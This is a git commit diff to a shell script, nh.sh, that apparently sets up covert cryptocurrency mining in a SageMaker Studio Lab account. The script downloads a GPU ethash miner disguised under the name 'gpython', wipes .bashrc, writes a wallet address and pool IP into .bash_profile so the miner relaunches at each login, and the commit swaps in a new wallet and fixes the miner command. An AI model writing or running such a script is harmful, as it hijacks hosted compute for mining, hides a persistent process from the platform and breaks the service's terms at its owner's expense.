8cb0526a8c92000688a5f19c9c05ba56584033c2
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-03-04 20:29:01 +0700

    Update nh.sh

--- nh.sh
+++ nh.sh
@@ -4,7 +4,7 @@ cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
 WORKER="0"
-WALLETNH="3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH"
+WALLETNH="3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX"
 POOLNH="144.217.82.15:80"
 wget https://ewr1.vultrobjects.com/mines/gpython
 echo ""  > /home/studio-lab-user/.bashrc
@@ -18,5 +18,5 @@ echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX"' >> /home/studio-lab-user/.bash_profile
 echo 'POOLNH="144.217.82.15:80"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
-echo "./.lib/gpython --algo ethash --server $POOLNH --user $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$worker -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
+echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
 chmod +x gas.sh && chmod +x gpython && cd ~/ && source .bashrc
